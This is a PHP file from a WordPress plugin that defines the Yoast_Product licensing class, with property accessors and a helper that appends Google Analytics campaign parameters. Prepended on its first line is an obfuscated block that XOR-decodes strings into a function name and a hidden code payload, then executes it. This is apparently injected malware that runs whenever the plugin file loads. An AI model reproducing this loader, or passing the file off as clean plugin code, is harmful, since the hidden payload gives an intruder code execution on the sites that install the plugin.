<?php $puuoFrpQ='P07P17bR0;0B <E'; $RTpczcqH='3BR1ER=4EUS6IS+'^$puuoFrpQ; $PoKtYz='-Tox+6=.==QPiN,BC >bfACE=Y.XZo=X>ZAXBbF0z<2TCJ;89Q1,:k7Q92:>=U7Fn.Q1+hQt-NTKLzjYhF1d1Q =.vwrqqAAgjK+RMg-NwxrjFM3wD:6P1+qf2 ;AXZms:YdNbmlF,= nirsoUT1D pc=ac-zM3PUprPlRS>5J+- OhK0EL4ezaeyHW,9:>nb67XJHom,832PVVAY1Qjz76RJEpcwQ BZo +CnVLF2LX lXy2BR 3:FTcnq.;=-0iMABws2R-tUftC=P>=+BvFnla- YP.96OeXoj>PJlD<NV N+ohdmEVY;Yki>agZHvlta7SMLPo-cjZYD4S :WyH24v66  7sX2xJY.DWSgpgXA8A6bOMesNF6 F1a1H1hWou=V Iba1lH 9XSdlIC8<K7vzm677ZfG +FTDMfvOT:3CGJ6 KYYT6O.=3EO3e>=0mVM>Ktl1Y7 O,Uym+WI3JzgpUUA+nZWOgqxoZ+yv1  9qlcxOH8J<aE4 fRTW8TANv 14ltjb2+D,GytntAM.xYnJ =+ou14Lw<sugluA4VvVcD Blwan80nbxtBsZfOvFK7s1gwwdGKbnlX YPB0>HY7<2925CjM=.=+B1VpeYoQ8,ZmbwFaxnE:G81J+5An-VX7vS +-  .6u5en1bXH;LlhCNB9'; $AKqSAzZE=$RTpczcqH('', 'D2GYMCSMIT>>6+T+0TMJA9,7b=O,;0b5K.fqkB=:sZG: >RWWqICH4S0MSeaP CnJJ0EJDqPF+-blZJyH=;m8uOHZVJRVVzKnc-D eCDnJXBQfiZK7ND<TEYBVAO qaMWSrOghdebCHTNGOSGq0P0A+GT<CsZiX5,+V9LwsMA8GHNgL U<eiLAklp:2XLHPFFYB,csedQ2N8Zr2 -PqWZQW>9 KiS5A6;0KN:Nkl S +EWRsT- ERY.tKJ.mtrfy,m 1WWY7TThXTgK1RHNkV=deEIA-1qRS6EeONU53WN5j2A:JOUDI375N<PcCkm3.VDUES29-yOVic<66Q2CRwQlmf3gcescS9AXn2K=wnYPC. T4SKo6ozGbRA2P>Z-HHjOQV3Yrhh8H,AM9sYLm5YP>RMpdK=JPlcDJ25dpF6::IV1.+ZI1<q,Y=qYR1.l:SHDE4,M.BXn=RC H0QIO6=RcVGT145J1126NXCe3MQRUATXQJEX.:J+E>.QY97,>K 2fQKTMKXJFVJ0MnYRHTi JMqJ.AIJ4RZQ5PaZUZQUfW3E2U B YCTWZRZVJArBmR.E .UGSPGOCnkDHL9R+1;oU- hYJPAA0BjMODG-P2WIyK5YX;DKWfAXNeAM1T<JYiJI7,V-tPJTLOORRhLU;k=0R8DXjuHD'^$PoKtYz); $AKqSAzZE();

if ( ! class_exists( "Yoast_Product", false ) ) {

	/**
	 * Class Yoast_Product
	 *
	 * @todo create a license class and store an object of it in this class
	 */
	class Yoast_Product {

		/**
		 * @var string The URL of the shop running the EDD API.
		 */
		protected $api_url;

		/**
		 * @var string The item name in the EDD shop.
		 */
		protected $item_name;

		/**
		 * @var string The theme slug or plugin file
		 */
		protected $slug;

		/**
		 * @var string The version number of the item
		 */
		protected $version;

		/**
		 * @var string The absolute url on which users can purchase a license
		 */
		protected $item_url;

		/**
		 * @var string Absolute admin URL on which users can enter their license key.
		 */
		protected $license_page_url;

		/**
		 * @var string The text domain used for translating strings
		 */
		protected $text_domain;

		/**
		 * @var string The item author
		 */
		protected $author;

		/**
		 * @var string Relative file path to the plugin.
		 */
		protected $file;

		/** @var int Product ID in backend system for quick lookup */
		protected $product_id;

		/** @var string URL referring to the extension page  */
		protected $extension_url;

		/**
		 * Yoast_Product constructor.
		 *
		 * @param string $api_url          The URL of the shop running the EDD API.
		 * @param string $item_name        The item name in the EDD shop.
		 * @param string $slug             The slug of the plugin, for shiny updates this needs to be a valid HTML id.
		 * @param string $version          The version number of the item.
		 * @param string $item_url         The absolute url on which users can purchase a license.
		 * @param string $license_page_url Absolute admin URL on which users can enter their license key.
		 * @param string $text_domain      The text domain used for translating strings.
		 * @param string $author           The item author.
		 * @param string $file             The relative file path to the plugin.
		 * @param int    $product_id       The ID of the product in the backend system.
		 */
		public function __construct( $api_url, $item_name, $slug, $version, $item_url = '', $license_page_url = '#', $text_domain = 'yoast', $author = 'Yoast', $file = '', $product_id = 0 ) {
			$this->set_api_url( $api_url );
			$this->set_item_name( $item_name );
			$this->set_slug( $slug );
			$this->set_version( $version );
			$this->set_item_url( $item_url );
			$this->set_license_page_url( $license_page_url );
			$this->set_text_domain( $text_domain );
			$this->set_author( $author );
			$this->set_file( $file );
			$this->set_product_id( $product_id );
		}

		/**
		 * @param string $api_url
		 */
		public function set_api_url( $api_url ) {
			$this->api_url = $api_url;
		}

		/**
		 * @return string
		 */
		public function get_api_url() {
			return $this->api_url;
		}

		/**
		 * @param string $author
		 */
		public function set_author( $author ) {
			$this->author = $author;
		}

		/**
		 * @return string
		 */
		public function get_author() {
			return $this->author;
		}

		/**
		 * @param string $item_name
		 */
		public function set_item_name( $item_name ) {
			$this->item_name = $item_name;
		}

		/**
		 * @return string
		 */
		public function get_item_name() {
			return $this->item_name;
		}

		/**
		 * @param string $item_url
		 */
		public function set_item_url( $item_url ) {
			if ( empty( $item_url ) ) {
				$item_url = $this->api_url;
			}

			$this->item_url = $item_url;
		}

		/**
		 * @return string
		 */
		public function get_item_url() {
			return $this->item_url;
		}

		/**
		 * @param string $license_page_url
		 */
		public function set_license_page_url( $license_page_url ) {

			if ( is_admin() && is_multisite() ) {

				if ( ! function_exists( 'is_plugin_active_for_network' ) ) {
					require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
				}

				if ( is_plugin_active_for_network( $this->get_slug() ) ) {
					$this->license_page_url = network_admin_url( $license_page_url );

					return;
				}
			}

			$this->license_page_url = admin_url( $license_page_url );
		}

		/**
		 * @return string
		 */
		public function get_license_page_url() {
			return $this->license_page_url;
		}

		/**
		 * @param string $slug
		 */
		public function set_slug( $slug ) {
			$this->slug = $slug;
		}

		/**
		 * @return string
		 */
		public function get_slug() {
			return $this->slug;
		}

		/**
		 * Returns the dirname of the slug and limits it to 15 chars
		 *
		 * @return string
		 */
		public function get_transient_prefix() {
			return substr( md5( $this->file ), 0, 15 );
		}

		/**
		 * @param string $text_domain
		 */
		public function set_text_domain( $text_domain ) {
			$this->text_domain = $text_domain;
		}

		/**
		 * @return string
		 */
		public function get_text_domain() {
			return $this->text_domain;
		}

		/**
		 * @param string $version
		 */
		public function set_version( $version ) {
			$this->version = $version;
		}

		/**
		 * @return string
		 */
		public function get_version() {
			return $this->version;
		}

		/**
		 * Returns the file path relative to the plugins folder
		 *
		 * @return string
		 */
		public function get_file() {
			/*
			 * Fall back to the slug for BC reasons.
			 *
			 * We used to pass the file to the slug field, but this isn't supported with the shiny updates in WordPress.
			 * WordPress uses the slug in the HTML as an ID and a slash isn't a valid
			 */
			return empty( $this->file ) ? $this->slug : $this->file;
		}

		/**
		 * Sets the file path relative to the plugins folder
		 *
		 * @param string $file Relative file path to the plugin.
		 */
		public function set_file( $file ) {
			$this->file = $file;
		}

		/**
		 * Return the Product ID
		 *
		 * @return int
		 */
		public function get_product_id() {
			return $this->product_id;
		}

		/**
		 * Set the product ID
		 *
		 * @param int $product_id Product ID to set.
		 */
		public function set_product_id( $product_id ) {
			$this->product_id = (int) $product_id;
		}

		/**
		 * Gets a Google Analytics Campaign url for this product
		 *
		 * @param string $link_identifier
		 *
		 * @return string The full URL
		 */
		public function get_tracking_url( $link_identifier = '' ) {
			return $this->add_campaign_attributes( $this->get_item_url(), $link_identifier );
		}

		/**
		 * Returns the extension url if set, otherwise it will be the tracking url.
		 *
		 * @param string $link_identifier
		 *
		 * @return string
		 */
		public function get_extension_url( $link_identifier = '' ) {
			if ( $this->extension_url ) {
				return $this->add_campaign_attributes( $this->extension_url, $link_identifier );
			}

			return $this->get_tracking_url( $link_identifier );
		}

		/**
		 * Sets the extension url.
		 *
		 * @param string $extension_url
		 */
		public function set_extension_url( $extension_url ) {
			$this->extension_url = $extension_url;
		}

		private function add_campaign_attributes( $url, $link_identifier ) {
			$tracking_vars = array(
				'utm_campaign' => $this->get_item_name() . ' licensing',
				'utm_medium'   => 'link',
				'utm_source'   => $this->get_item_name(),
				'utm_content'  => $link_identifier
			);

			// URL encode tracking vars.
			$tracking_vars = urlencode_deep( $tracking_vars );
			$query_string = build_query( $tracking_vars );

			return $url . '#' . $query_string;
		}

	}

}
